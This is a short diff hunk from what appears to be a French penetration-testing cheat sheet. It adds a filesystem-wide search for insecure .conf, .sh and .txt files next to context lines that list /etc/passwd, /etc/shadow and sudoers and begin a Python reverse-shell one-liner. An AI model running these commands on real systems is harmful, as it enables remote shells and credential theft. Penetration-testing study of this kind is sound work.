@@ -91,6 +91,9 @@ python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.S
 ls -la /etc/passwd /etc/shadow
 ls -la /etc/sudoers
 
+# rechercher des fichiers mal sécurisés
+find / -type f \( -name "*.conf" -o -name "*.sh" -o -name "*.txt" \) -exec ls -la {} +
+
 
 # developer
 - Prénom NOM: Mouhamed DIOUF
